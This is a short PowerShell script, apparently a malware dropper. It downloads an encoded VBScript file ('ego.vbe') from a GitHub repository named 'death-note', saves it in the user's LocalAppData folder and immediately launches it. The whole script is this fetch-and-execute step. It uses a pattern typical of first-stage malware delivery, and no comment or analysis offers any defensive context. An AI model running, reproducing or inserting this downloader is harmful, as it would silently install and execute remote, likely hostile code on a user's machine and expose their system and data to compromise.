$Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ego.vbe"
$FileName = "ego.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

Invoke-WebRequest -Uri $Url -OutFile $DownloadPath
Start-Process -FilePath $DownloadPath